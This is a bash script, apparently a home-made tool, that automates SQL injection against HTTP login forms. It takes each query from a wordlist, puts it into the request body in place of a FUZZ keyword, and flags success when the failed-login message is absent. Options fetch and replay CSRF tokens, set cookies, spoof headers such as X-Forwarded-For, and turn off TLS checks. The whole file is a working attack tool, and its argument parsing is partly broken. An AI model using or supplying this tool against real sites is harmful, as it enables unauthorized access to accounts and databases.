#!/bin/bash

# HTTP login page Brute Force with SQL Queries by Sajibu

# Parsing Arguments

while [[ $# -gt 0 && $# -lt 16 ]]; do

  case "$1" in
    -u|--url)
      URL="$2"
      shift # past argument
      shift # past value
      ;;
    -w|--wordlist)
      WORDLIST=$2
      shift # past argument
      shift # past value
      ;;
    -r|--request)
      LOGIN=$2
      shift # past argument
      shift # past value
      ;;
    -H|--header)
      HEADER=$2
      shift # past argument
      shift # past value
      ;;
    -e|--error)
      ERROR=$2
      shift # past argument
      shift # past value
      ;;
    -c|--cookie)
      Cookie=$2
      shift # past argument
      shift # past value
      ;;
    -s|--ssl)
      SSL=$2
      shift # past argument
      shift # past value
      ;;
    -C|--csrf)
      CSRF=$2
      shift # past argument
      shift # past value
      ;;
    -v|--verbose)
      VERBOSE=$1
      shift # past argument
      shift # past value
      ;;          
    -h|--help)
    echo -e "USAGE:\n-u | --url = Supply the login page, for example: -u http://192.168.98.200/login.php\n-w | --wordlist = Wordlist path.\n-r | --request = Request body, for example: -r 'user=FUZZ&password=123' replace injectable string with FUZZ keyword!\n-e | --error = Failed login attempt message, example: -e 'Invalid user or password.'\n-C | --csrf = Bypass CSRF protection. Use example: -C 'true'\n-c | --cookie = Set Cookie, for example: 'wordpress_test_cookie=WP%20Cookie%20check'\n-H | --header = Any header, for example: 'X-Forwarded-For: 10.10.10.10'\n-s | --ssl = No SSL/TLS check. Example: --ssl true\n-v | --verbose = Print header and post response to the screen. Example: -v | --verbose"
      shift # past argument
      exit 1
      ;;
    -*|--*)
      echo -e "$1 Required one parameter"
      exit 1
      ;;

  esac

done

while [[ $# -gt 0 && $# -lt 16 ]]; do

    case $3 in
    -u|--url)
      URL=$4
      shift # past argument
      shift # past value
      ;;
    -w|--wordlist)
      WORDLIST=$4
      shift # past argument
      shift # past value
      ;;
    -r|--request)
      LOGIN=$4
      shift # past argument
      shift # past value
      ;;
    -c|--cookie)
      Cookie=$4
      shift # past argument
      shift # past value
      ;;      
    -H|--header)
      HEADER=$4
      shift # past argument
      shift # past value
      ;;
    -e|--error)
      ERROR=$4
      shift # past argument
      shift # past value
      ;;
    -s|--ssl)
      SSL=$4
      shift # past argument
      shift # past value
      ;;      
    -C|--csrf)
      CSRF=$4
      shift # past argument
      shift # past value
      ;;
    -v|--verbose)
      VERBOSE=$3
      shift # past argument
      shift # past value
      ;;          
    -*|--*)
      echo -e "$3 Required one parameter"
      exit 1
      ;;
        
  esac

done

while [[ $# -gt 0 && $# -lt 16 ]]; do

    case $5 in
    -u|--url)
      URL=$6
      shift # past argument
      shift # past value
      ;;
    -w|--wordlist)
      WORDLIST=$6
      shift # past argument
      shift # past value
      ;;
    -r|--request)
      LOGIN=$6
      shift # past argument
      shift # past value
      ;;
    -c|--cookie)
      Cookie=$6
      shift # past argument
      shift # past value
      ;;      
    -H|--header)
      HEADER=$6
      shift # past argument
      shift # past value
      ;;
    -e|--error)
      ERROR=$6
      shift # past argument
      shift # past value
      ;;
    -s|--ssl)
      SSL=$6
      shift # past argument
      shift # past value
      ;; 
    -C|--csrf)
      CSRF=$6
      shift # past argument
      shift # past value
      ;;
    -v|--verbose)
      VERBOSE=$5
      shift # past argument
      shift # past value
      ;;                     
    -*|--*)
      echo -e "$5 Required one parameter"
      exit 1
      ;;

  esac

done

while [[ $# -gt 0 && $# -lt 16 ]]; do

    case $7 in
    -u|--url)
      URL=$8
      shift # past argument
      shift # past value
      ;;
    -w|--wordlist)
      WORDLIST=$8
      shift # past argument
      shift # past value
      ;;
    -r|--request)
      LOGIN=$8
      shift # past argument
      shift # past value
      ;;
    -H|--header)
      HEADER=$8
      shift # past argument
      shift # past value
      ;;
    -c|--cookie)
      Cookie=$8
      shift # past argument
      shift # past value
      ;;      
    -e|--error)
      ERROR=$8
      shift # past argument
      shift # past value
      ;;
    -s|--ssl)
      SSL=$8
      shift # past argument
      shift # past value
      ;; 
    -C|--csrf)
      CSRF=$8
      shift # past argument
      shift # past value
      ;;
    -v|--verbose)
      VERBOSE=$7
      shift # past argument
      shift # past value
      ;;                     
    -*|--*)
      echo -e "$7 Required one parameter"
      exit 1
      ;;

  esac

done

while [[ $# -gt 0 && $# -lt 16 ]]; do

    case $9 in
    -u|--url)
      URL=${10}
      shift # past argument
      shift # past value
      ;;
    -w|--wordlist)
      WORDLIST=${10}
      shift # past argument
      shift # past value
      ;;
    -r|--request)
      LOGIN=${10}
      shift # past argument
      shift # past value
      ;;
    -c|--cookie)
      Cookie=${10}
      shift # past argument
      shift # past value
      ;;      
    -H|--header)
      HEADER=${10}
      shift # past argument
      shift # past value
      ;;
    -e|--error)
      ERROR=${10}
      shift # past argument
      shift # past value
      ;;
    -s|--ssl)
      SSL=${10}
      shift # past argument
      shift # past value
      ;;    
    -C|--csrf)
      CSRF=${10}
      shift # past argument
      shift # past value
      ;;
    -v|--verbose)
      VERBOSE=${9}
      shift # past argument
      shift # past value
      ;;                  
    -*|--*)
      echo -e "$9 Required one parameter"
      exit 1
      ;;

  esac

done

while [[ $# -gt 0 && $# -lt 16 ]]; do

    case ${11} in
    -u|--url)
      URL=${12}
      shift # past argument
      shift # past value
      ;;
    -w|--wordlist)
      WORDLIST=${12}
      shift # past argument
      shift # past value
      ;;
    -r|--request)
      LOGIN=${12}
      shift # past argument
      shift # past value
      ;;
    -c|--cookie)
      cookie=${12}
      shift # past argument
      shift # past value
      ;;      
    -H|--header)
      HEADER=${12}
      shift # past argument
      shift # past value
      ;;
    -e|--error)
      ERROR=${12}
      shift # past argument
      shift # past value
      ;;
    -s|--ssl)
      SSL=${12}
      shift # past argument
      shift # past value
      ;; 
    -C|--csrf)
      CSRF=${12}
      shift # past argument
      shift # past value
      ;;
    -v|--verbose)
      VERBOSE=${11}
      shift # past argument
      shift # past value
      ;;                     
    -*|--*)
      echo -e "${11} Required one parameter"
      exit 1
      ;;

  esac

done

while [[ $# -gt 0 && $# -lt 16 ]]; do

    case ${13} in
    -u|--url)
      URL=${14}
      shift # past argument
      shift # past value
      ;;
    -w|--wordlist)
      WORDLIST=${14}
      shift # past argument
      shift # past value
      ;;
    -r|--request)
      LOGIN=${14}
      shift # past argument
      shift # past value
      ;;
    -c|--cookie)
      cookie=${14}
      shift # past argument
      shift # past value
      ;;      
    -H|--header)
      HEADER=${14}
      shift # past argument
      shift # past value
      ;;
    -e|--error)
      ERROR=${14}
      shift # past argument
      shift # past value
      ;;
    -s|--ssl)
      SSL=${14}
      shift # past argument
      shift # past value
      ;; 
    -C|--csrf)
      CSRF=${14}
      shift # past argument
      shift # past value
      ;;
    -v|--verbose)
      VERBOSE=${13}
      shift # past argument
      shift # past value
      ;;                     
    -*|--*)
      echo -e "${13} Required one parameter"
      exit 1
      ;;

  esac

done

while [[ $# -gt 0 && $# -lt 16 ]]; do

    case ${16} in
    -u|--url)
      URL=${16}
      shift # past argument
      shift # past value
      ;;
    -w|--wordlist)
      WORDLIST=${16}
      shift # past argument
      shift # past value
      ;;
    -r|--request)
      LOGIN=${16}
      shift # past argument
      shift # past value
      ;;
    -c|--cookie)
      cookie=${16}
      shift # past argument
      shift # past value
      ;;      
    -H|--header)
      HEADER=${16}
      shift # past argument
      shift # past value
      ;;
    -e|--error)
      ERROR=${16}
      shift # past argument
      shift # past value
      ;;
    -s|--ssl)
      SSL=${16}
      shift # past argument
      shift # past value
      ;; 
    -C|--csrf)
      CSRF=${16}
      shift # past argument
      shift # past value
      ;;
    -v|--verbose)
      VERBOSE=${15}
      shift # past argument
      shift # past value
      ;;                     
    -*|--*)
      echo -e "${15} Required one parameter"
      exit 1
      ;;

  esac

done

# Arguments check

if [[ "$URL" == '' ]]; then

  echo -e "[-] URL is not specified, use -u or --url."
  

  if [[ "$LOGIN" == '' ]]; then

    echo -e "[-] Request body is not specified, use -r|--request."

  fi

  if [[ "$ERROR" == '' ]]; then

    echo -e "[-] Error message - Error response message isn't specified, use -e or --error."
    
  fi

  if [[ "$WORDLIST" == '' ]]; then

    echo -e "[-] Path for SQL injection dictionary queries isn't specified, use -w or --wordlist."
    echo -e "[-] Please use single quotes and type -h or --help for usage."
    
  exit

  fi

fi

if [[ "$LOGIN" == '' ]]; then

  echo -e "[-] Request body is not specified, use -r|--request."

  if [[ "$ERROR" == '' ]]; then

    echo -e "[-] Error message - Error response message isn't specified, use -e or --error."

  fi

  if [[ "$WORDLIST" == '' ]]; then

    echo -e "[-] Path for SQL injection dictionary queries isn't specified, use -w or --wordlist."

  exit

  fi
    
fi

  
if [[ "$ERROR" == '' ]]; then

  echo -e "[-] Error message - Error response message isn't specified, use -e or --error."

  if [[ "$WORDLIST" == '' ]]; then

    echo -e "[-] Path for SQL injection dictionary queries isn't specified, use -w or --wordlist."

  exit

  fi  
    
fi
    
if [[ "$WORDLIST" == '' ]]; then

  echo -e "[-] Path for SQL injection dictionary queries isn't specified, use -w or --wordlist."

  exit  

fi

if [[ "$SSL" != '' ]] && [[ "$SSL" != 'true' ]];then

  echo -e "-s / --ssl must be set to true!"
  
  exit

fi

function verbose(){

    #Header is set with different arguements check

    if [ "$HEADER" != '' ] && [ "$Cookie" == '' ] && [ "$CSRF" == '' ] && [ "$SSL" != 'true' ]; then
      
      REQUEST=$(curl -D headers.txt -s -v -c "cookies.txt" -b "cookies.txt" -s "${URL}" -H "${HEADER}"  --data-raw "${LOGIN/FUZZ/$wordlist}")
      
      echo -e "$REQUEST"
      
      response=$(echo -e $REQUEST > response.txt)

    elif [ "$HEADER" != '' ] && [ "$Cookie" != '' ] && [ "$CSRF" == '' ] && [ "$SSL" != 'true' ]; then
      
      REQUEST=$(curl -D headers.txt -s -v -c "cookies.txt" -b "cookies.txt" -s "${URL}" --cookie "${Cookie}" -H "${HEADER}" --data-raw "${LOGIN/FUZZ/$wordlist}")
      
      echo -e "$REQUEST"
      
      response=$(echo -e $REQUEST > response.txt)

    elif [ "$HEADER" != '' ] && [ "$Cookie" != '' ] && [ "$CSRF" != '' ] && [ "$SSL" != 'true' ]; then
      
      CSRF_Name=$(curl -D headers.txt -s "$URL" | grep -o -P '(?<=csrf).*(?=" value)')
      
      CSRF_REQ=$(curl -D headers.txt -s -c "cookies.txt" -d "$LOGIN" "${URL}" | grep -o -P '(?<=csrf).*(?=")' | grep -i -o -P '(?<=value=").*(?=)')
      
      REQUEST=$(curl -D headers.txt -v -s -b "cookies.txt" "${URL}" -H ${HEADER} --cookie ${Cookie} --cookie ${CSRF_REQ} --data-raw "${LOGIN/FUZZ/$wordlist}" -d "csrf$CSRF_Name=$CSRF_REQ" --header "X-CSRFToken: {$CSRF_REQ}")
      
      echo -e "$REQUEST"
      
      response=$(echo -e $REQUEST > response.txt)

    elif [ "$HEADER" != '' ] && [ "$Cookie" != '' ] && [ "$CSRF" != '' ] && [ "$SSL" == 'true' ]; then
      
      CSRF_Name=$(curl -D headers.txt -s "$URL" | grep -o -P '(?<=csrf).*(?=" value)')
      
      CSRF_REQ=$(curl -D headers.txt -s -c "cookies.txt" -d "$LOGIN" "${URL}" | grep -o -P '(?<=csrf).*(?=")' | grep -i -o -P '(?<=value=").*(?=)')
      
      REQUEST=$(curl -D headers.txt -v -s -b -k "cookies.txt" "${URL}" --cookie ${Cookie} --cookie ${CSRF_REQ} -H ${HEADER} --data-raw "${LOGIN/FUZZ/$wordlist}" -d "csrf$CSRF_Name=$CSRF_REQ" --header "X-CSRFToken: {$CSRF_REQ}")
      
      echo -e "$REQUEST"
      
      response=$(echo -e $REQUEST > response.txt)

    elif [ "$HEADER" != '' ] && [ "$Cookie" == '' ] && [ "$CSRF" == '' ] && [ "$SSL" != 'true' ]; then
      
      REQUEST=$(curl -D headers.txt -s -k -c "cookies.txt" -b "cookies.txt" -v -s "${URL}" -H "${HEADER}" --data-raw "${LOGIN/FUZZ/$wordlist}")
      
      echo -e "$REQUEST"
      
      response=$(echo -e $REQUEST > response.txt)

    elif [ "$HEADER" != '' ] && [ "$Cookie" == '' ] && [ "$CSRF" != '' ] && [ "$SSL" != 'true' ]; then
      
      CSRF_Name=$(curl -D headers.txt -s "$URL" | grep -o -P '(?<=csrf).*(?=" value)')
      
      CSRF_REQ=$(curl -D headers.txt -s -c "cookies.txt" -d "$LOGIN" "${URL}" | grep -o -P '(?<=csrf).*(?=")' | grep -i -o -P '(?<=value=").*(?=)')
      
      REQUEST=$(curl -D headers.txt -v -s -b "cookies.txt" "${URL}" -H ${HEADER} --cookie ${CSRF_REQ} --data-raw "${LOGIN/FUZZ/$wordlist}" -d "csrf$CSRF_Name=$CSRF_REQ" --header "X-CSRFToken: {$CSRF_REQ}")
      
      echo -e "$REQUEST"
      
      response=$(echo -e $REQUEST > response.txt)

    # Cookie is set with other arguments

    elif [ "$HEADER" == '' ] && [ "$Cookie" != '' ] && [ "$CSRF" == '' ] && [ "$SSL" != 'true' ]; then
      
      REQUEST=$(curl -D headers.txt -s -v -c "cookies.txt" -b "cookies.txt" "${URL}" --cookie "${Cookie}" -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' --data-raw "${LOGIN/FUZZ/$wordlist}")
      
      echo -e "$REQUEST"
      
      response=$(echo -e $REQUEST > response.txt)

    elif [ "$HEADER" == '' ] && [ "$Cookie" != '' ] && [ "$CSRF" != '' ] && [ "$SSL" != 'true' ]; then
      
      CSRF_Name=$(curl -D headers.txt -s "$URL" | grep -o -P '(?<=csrf).*(?=" value)')
      
      CSRF_REQ=$(curl -D headers.txt -s -c "cookies.txt" -d "$LOGIN" "${URL}" | grep -o -P '(?<=csrf).*(?=")' | grep -i -o -P '(?<=value=").*(?=)')
      
      REQUEST=$(curl -D headers.txt -v -s -b "cookies.txt" "${URL}" --cookie ${Cookie} --cookie ${CSRF_REQ} --data-raw "${LOGIN/FUZZ/$wordlist}" -d "csrf$CSRF_Name=$CSRF_REQ" --header "X-CSRFToken: {$CSRF_REQ}")
      
      echo -e "$REQUEST"
      
      response=$(echo -e $REQUEST > response.txt)

    elif [ "$HEADER" == '' ] && [ "$Cookie" != '' ] && [ "$CSRF" != '' ] && [ "$SSL" == 'true' ]; then
      
      CSRF_Name=$(curl -D headers.txt -s "$URL" | grep -o -P '(?<=csrf).*(?=" value)')
      
      CSRF_REQ=$(curl -D headers.txt -s -c "cookies.txt" -d "$LOGIN" "${URL}" | grep -o -P '(?<=csrf).*(?=")' | grep -i -o -P '(?<=value=").*(?=)')
      
      REQUEST=$(curl -D headers.txt -v -s -k -b "cookies.txt" "${URL}" --cookie ${Cookie} --cookie ${CSRF_REQ} --data-raw "${LOGIN/FUZZ/$wordlist}" -d "csrf$CSRF_Name=$CSRF_REQ" --header "X-CSRFToken: {$CSRF_REQ}")
      
      echo -e "$REQUEST"
      
      response=$(echo -e $REQUEST > response.txt)

    elif [ "$HEADER" == '' ] && [ "$Cookie" != '' ] && [ "$CSRF" == '' ] && [ "$SSL" == 'true' ]; then
      
      REQUEST=$(curl -D headers.txt -s -k -c "cookies.txt" -b "cookies.txt" -v -s "${URL}" --cookie "${Cookie}" -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' --data-raw "${LOGIN/FUZZ/$wordlist}")      
      
      echo -e "$REQUEST"
      
      response=$(echo -e $REQUEST > response.txt)

    # CSRF is true with other arguments

    elif [ "$HEADER" == '' ] && [ "$Cookie" == '' ] && [ "$CSRF" != '' ] && [ "$SSL" != 'true' ]; then
        
        CSRF_Name=$(curl -D headers.txt -s "$URL" | grep -o -P '(?<=csrf).*(?=" value)')
        
        CSRF_REQ=$(curl -D headers.txt -s -c "cookies.txt" -d "$LOGIN" "${URL}" | grep -o -P '(?<=csrf).*(?=")' | grep -i -o -P '(?<=value=").*(?=)')
        
        REQUEST=$(curl -D headers.txt -v -s -b "cookies.txt" "${URL}" --cookie ${CSRF_REQ} --data-raw "${LOGIN/FUZZ/$wordlist}" -d "csrf$CSRF_Name=$CSRF_REQ" --header "X-CSRFToken: {$CSRF_REQ}" --header "X-CSRFToken: {$CSRF_REQ}")
      
        echo -e "$REQUEST"
        
        response=$(echo -e $REQUEST > response.txt)

    elif [ "$HEADER" == '' ] && [ "$Cookie" == '' ] && [ "$CSRF" != '' ] && [ "$SSL" == 'true' ]; then
      
      CSRF_Name=$(curl -D headers.txt -s "$URL" | grep -o -P '(?<=csrf).*(?=" value)')
      
      CSRF_REQ=$(curl -D headers.txt -s -c "cookies.txt" -d "$LOGIN" "${URL}" | grep -o -P '(?<=csrf).*(?=")' | grep -i -o -P '(?<=value=").*(?=)')
      
      REQUEST=$(curl -D headers.txt -v -s -k -b "cookies.txt" "${URL}" --cookie ${CSRF_REQ} --data-raw "${LOGIN/FUZZ/$wordlist}" -d "csrf$CSRF_Name=$CSRF_REQ" --header "X-CSRFToken: {$CSRF_REQ}")
      
      echo -e "$REQUEST"
      
      response=$(echo -e $REQUEST > response.txt)


    # Only SSL is TRUE

    elif [ "$HEADER" == '' ] && [ "$Cookie" == '' ] && [ "$CSRF" == '' ] && [ "$SSL" != 'true' ]; then
      
      REQUEST=$(curl -D headers.txt -v -s -c "cookies.txt" -b "cookies.txt" -k "${URL}" -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' --data-raw "${LOGIN/FUZZ/$wordlist}")
      
      echo -e "$REQUEST"
      
      response=$(echo -e $REQUEST > response.txt)

    else

      REQUEST=$(curl -D headers.txt -v -c "cookies.txt" -b "cookies.txt" -s "${URL}" -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' --data-raw "${LOGIN/FUZZ/$wordlist}")
      
      echo -e "$REQUEST"
      
      response=$(echo -e $REQUEST > response.txt)
       
  fi

}

# Variables

PASS="test"
wordlist=${WORDLIST}

# Counter
i=0

# Main loop 

while IFS= read -r wordlist;do
    
    # Increase counter
    ((i=i+1))

    # Feedback for user
    echo -e "[-] Try ${i}: ${wordlist}"

    # Connect to server

    if [[ $VERBOSE == '-v' ]]; then
      
      verbose

    fi

    #Header is set with different arguements check

    if [ "$HEADER" != '' ] && [ "$Cookie" == '' ] && [ "$CSRF" == '' ] && [ "$SSL" != 'true' ]; then
      
      REQUEST=$(curl -D headers.txt -s "${URL}" -H "${HEADER}"  --data-raw "${LOGIN/FUZZ/$wordlist}")
      
      response=$(echo -e $REQUEST > response.txt)


    elif [ "$HEADER" != '' ] && [ "$Cookie" != '' ] && [ "$CSRF" == '' ] && [ "$SSL" != 'true' ]; then
      
      REQUEST=$(curl -D headers.txt -s "${URL}" --cookie "${Cookie}" -H "${HEADER}" --data-raw "${LOGIN/FUZZ/$wordlist}")
      
      response=$(echo -e $REQUEST > response.txt)

    elif [ "$HEADER" != '' ] && [ "$Cookie" != '' ] && [ "$CSRF" != '' ] && [ "$SSL" != 'true' ]; then
      
      CSRF_Name=$(curl -D headers.txt -s "$URL" | grep -o -P '(?<=csrf).*(?=" value)')
      
      CSRF_REQ=$(curl -D headers.txt -s -c "cookies.txt" -d "$LOGIN" "${URL}" | grep -o -P '(?<=csrf).*(?=")' | grep -i -o -P '(?<=value=").*(?=)')
      
      REQUEST=$(curl -D headers.txt -s -b "cookies.txt" "${URL}" -H ${HEADER} --cookie ${Cookie} --cookie ${CSRF_REQ} --data-raw "${LOGIN/FUZZ/$wordlist}" -d "csrf$CSRF_Name=$CSRF_REQ" --header "X-CSRFToken: {$CSRF_REQ}")
      
      response=$(echo -e $REQUEST > response.txt)
      
    elif [ "$HEADER" != '' ] && [ "$Cookie" != '' ] && [ "$CSRF" != '' ] && [ "$SSL" == 'true' ]; then
      
      CSRF_Name=$(curl -D headers.txt -s "$URL" | grep -o -P '(?<=csrf).*(?=" value)')
      
      CSRF_REQ=$(curl -D headers.txt -s -c "cookies.txt" -d "$LOGIN" "${URL}" | grep -o -P '(?<=csrf).*(?=")' | grep -i -o -P '(?<=value=").*(?=)')
      
      REQUEST=$(curl -D headers.txt -s -b -k "cookies.txt" "${URL}" --cookie ${Cookie} --cookie ${CSRF_REQ} -H ${HEADER} --data-raw "${LOGIN/FUZZ/$wordlist}" -d "csrf$CSRF_Name=$CSRF_REQ" --header "X-CSRFToken: {$CSRF_REQ}")
      
      response=$(echo -e $REQUEST > response.txt)
      
    elif [ "$HEADER" != '' ] && [ "$Cookie" == '' ] && [ "$CSRF" == '' ] && [ "$SSL" != 'true' ]; then
      
      REQUEST=$(curl -D headers.txt -s -k "${URL}" -H "${HEADER}" --data-raw "${LOGIN/FUZZ/$wordlist}")
      
      response=$(echo -e $REQUEST > response.txt)
      
    elif [ "$HEADER" != '' ] && [ "$Cookie" == '' ] && [ "$CSRF" != '' ] && [ "$SSL" != 'true' ]; then
      
      CSRF_Name=$(curl -D headers.txt -s "$URL" | grep -o -P '(?<=csrf).*(?=" value)')
      
      CSRF_REQ=$(curl -D headers.txt -s -c "cookies.txt" -d "$LOGIN" "${URL}" | grep -o -P '(?<=csrf).*(?=")' | grep -i -o -P '(?<=value=").*(?=)')
      
      REQUEST=$(curl -D headers.txt -s -b "cookies.txt" "${URL}" -H ${HEADER} --cookie ${CSRF_REQ} --data-raw "${LOGIN/FUZZ/$wordlist}" -d "csrf$CSRF_Name=$CSRF_REQ" --header "X-CSRFToken: {$CSRF_REQ}")
          
      response=$(echo -e $REQUEST > response.txt)
      
    # Cookie is set with other arguments

    elif [ "$HEADER" == '' ] && [ "$Cookie" != '' ] && [ "$CSRF" == '' ] && [ "$SSL" != 'true' ]; then
      
      REQUEST=$(curl -D headers.txt -s "${URL}" --cookie "${Cookie}" -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' --data-raw "${LOGIN/FUZZ/$wordlist}")
      
      response=$(echo -e $REQUEST > response.txt)
      
    elif [ "$HEADER" == '' ] && [ "$Cookie" != '' ] && [ "$CSRF" != '' ] && [ "$SSL" != 'true' ]; then
      
      CSRF_Name=$(curl -D headers.txt -s "$URL" | grep -o -P '(?<=csrf).*(?=" value)')
      
      CSRF_REQ=$(curl -D headers.txt -s -c "cookies.txt" -d "$LOGIN" "${URL}" | grep -o -P '(?<=csrf).*(?=")' | grep -i -o -P '(?<=value=").*(?=)')
      
      REQUEST=$(curl -D headers.txt -s -b "cookies.txt" "${URL}" --cookie ${Cookie} --cookie ${CSRF_REQ} --data-raw "${LOGIN/FUZZ/$wordlist}" -d "csrf$CSRF_Name=$CSRF_REQ" --header "X-CSRFToken: {$CSRF_REQ}")
      
      response=$(echo -e $REQUEST > response.txt)
      
    elif [ "$HEADER" == '' ] && [ "$Cookie" != '' ] && [ "$CSRF" != '' ] && [ "$SSL" == 'true' ]; then
      
      CSRF_Name=$(curl -D headers.txt -s "$URL" | grep -o -P '(?<=csrf).*(?=" value)')
      
      CSRF_REQ=$(curl -D headers.txt -s -c "cookies.txt" -d "$LOGIN" "${URL}" | grep -o -P '(?<=csrf).*(?=")' | grep -i -o -P '(?<=value=").*(?=)')
      
      REQUEST=$(curl -D headers.txt -s -k -b "cookies.txt" "${URL}" --cookie ${Cookie} --cookie ${CSRF_REQ} --data-raw "${LOGIN/FUZZ/$wordlist}" -d "csrf$CSRF_Name=$CSRF_REQ" --header "X-CSRFToken: {$CSRF_REQ}")
          
      response=$(echo -e $REQUEST > response.txt)
      
    elif [ "$HEADER" == '' ] && [ "$Cookie" != '' ] && [ "$CSRF" == '' ] && [ "$SSL" == 'true' ]; then
      
      REQUEST=$(curl -D headers.txt -s -k -s "${URL}" --cookie "${Cookie}" -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' --data-raw "${LOGIN/FUZZ/$wordlist}")      
      
      response=$(echo -e $REQUEST > response.txt)
      

    # CSRF is true with other arguments

    elif [ "$HEADER" == '' ] && [ "$Cookie" == '' ] && [ "$CSRF" != '' ] && [ "$SSL" != 'true' ]; then
        
        CSRF_Name=$(curl -D headers.txt -s "$URL" | grep -o -P '(?<=csrf).*(?=" value)')
        
        CSRF_REQ=$(curl -D headers.txt -s -c "cookies.txt" -d "$LOGIN" "${URL}" | grep -o -P '(?<=csrf).*(?=")' | grep -i -o -P '(?<=value=").*(?=)')
        
        REQUEST=$(curl -D headers.txt -s -b "cookies.txt" "${URL}" --cookie ${CSRF_REQ} --data-raw "${LOGIN/FUZZ/$wordlist}" -d "csrf$CSRF_Name=$CSRF_REQ" --header "X-CSRFToken: {$CSRF_REQ}" --header "X-CSRFToken: {$CSRF_REQ}")
              
        response=$(echo -e $REQUEST > response.txt)


    elif [ "$HEADER" == '' ] && [ "$Cookie" == '' ] && [ "$CSRF" != '' ] && [ "$SSL" == 'true' ]; then
      
      CSRF_Name=$(curl -D headers.txt -s "$URL" | grep -o -P '(?<=csrf).*(?=" value)')
      
      CSRF_REQ=$(curl -D headers.txt -s -c "cookies.txt" -d "$LOGIN" "${URL}" | grep -o -P '(?<=csrf).*(?=")' | grep -i -o -P '(?<=value=").*(?=)')
      
      REQUEST=$(curl -D headers.txt -s -k -b "cookies.txt" "${URL}" --cookie ${CSRF_REQ} --data-raw "${LOGIN/FUZZ/$wordlist}" -d "csrf$CSRF_Name=$CSRF_REQ" --header "X-CSRFToken: {$CSRF_REQ}")
      
      response=$(echo -e $REQUEST > response.txt)
      
    # Only SSL is TRUE

    elif [ "$HEADER" == '' ] && [ "$Cookie" == '' ] && [ "$CSRF" == '' ] && [ "$SSL" != 'true' ]; then
      
      REQUEST=$(curl -D headers.txt -s -k "${URL}" -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' --data-raw "${LOGIN/FUZZ/$wordlist}")

    else

      REQUEST=$(curl -D headers.txt -s "${URL}" -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' --data-raw "${LOGIN/FUZZ/$wordlist}")
      
      response=$(echo -e $REQUEST > response.txt)
      
    fi


  # Response check
  status_code=`cat "headers.txt"`
  match_response=$(echo -e $REQUEST)

  if [[ $VERBOSE == '-v' ]] && [[ "$match_response" != *"$ERROR"* ]];then #&& [[ $status_code == *"200 OK"* ]] || [[ "$status_code" == *"302"* ]] && [[ $VERBOSE == '-v' ]] && [[ "$match_response" != *"$ERROR"* ]];then
    
    # Success!
    echo -e "[*] Injection worked!"
    echo -e "[*] SQL Query in Username field is: ${wordlist}"
    printf "[*] If you're seen this message after the first try, please double check the failed login attempt message \n    or if CSRF protection is on to avoid false postive!\n"
    break 2

  elif [[ "$match_response" != *"$ERROR"* ]] && [[ $VERBOSE == '' ]] && [[ "$status_code" != *"200"* ]]; then

    # Success!
    echo -e "[*] Injection worked!"
    echo -e "[*] SQL Query in Username field is: ${wordlist}"
    printf "[*] If you're seen this message after the first try, please double check the failed login attempt message \n    or if CSRF protection is on to avoid false postive!\n"
    break 2

  fi

done < ${wordlist}
